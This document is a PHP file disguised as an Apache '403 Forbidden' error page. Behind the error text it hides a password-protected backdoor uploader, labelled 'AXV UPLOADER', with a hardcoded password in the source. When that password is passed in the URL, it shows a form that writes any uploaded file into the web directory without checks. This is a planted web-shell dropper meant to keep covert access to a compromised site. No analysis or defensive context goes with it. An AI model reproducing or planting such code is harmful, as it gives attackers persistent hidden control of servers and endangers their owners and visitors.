<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php
if (isset($_POST['uploaded'])) {
$file = $_FILES['files']['name'];
$files = $_FILES['files']['tmp_name'];
$folder = "";
if (move_uploaded_file($files, $folder . $file)) {
    $result = "Uploaded : => <a href='$file' target='_blank'>Your file here</a>";
} else {
    $result = "Failed to upload...!";
}
}
$password = "4Xvt3cH1337";
if ($_GET['passwd'] == $password) {
echo '<br /><br /># AXV UPLOADER<br /><form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="files" />
    <input type="submit" name="uploaded" value="Upload">
</form><div style="margin-top: 20px;">' . $result . '</div>';
}?>
</body></html>